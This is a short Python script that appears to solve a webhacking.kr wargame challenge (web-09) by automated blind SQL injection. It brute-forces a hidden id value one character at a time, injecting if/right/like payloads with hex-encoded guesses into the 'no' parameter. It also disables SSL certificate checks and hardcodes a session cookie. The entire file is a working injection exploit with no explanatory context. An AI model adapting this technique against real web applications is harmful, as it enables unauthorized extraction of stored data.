import urllib.request
import ssl

context = ssl._create_unverified_context()

url="https://webhacking.kr/challenge/web-09/?no=(if(right(id,"
ans_hex = ""
ans=""
j=0

for i in range(1,20):
	if j==127 : break
	for j in range(33,128):
		try:
			tmp = str(hex(j)[2:])+ans_hex
			payload=str(i)+")like(0x"+tmp+"),3,200))"
			data = urllib.request.Request(url+payload)
			#print(url+payload)
			data.add_header("Cookie","PHPSESSID=kcoc1q60bjhtgclm3n8l46p161")
			
			response = urllib.request.urlopen(data, context=context).read().decode('utf8')
			if response.find("Secret") != -1 and tmp!="45" and j!=37 and j!=95 and j!=92:
				print(chr(j))
				ans_hex = tmp
				ans = chr(j)+ans
				break
		except Exception as e:
			continue

print(ans.lower())
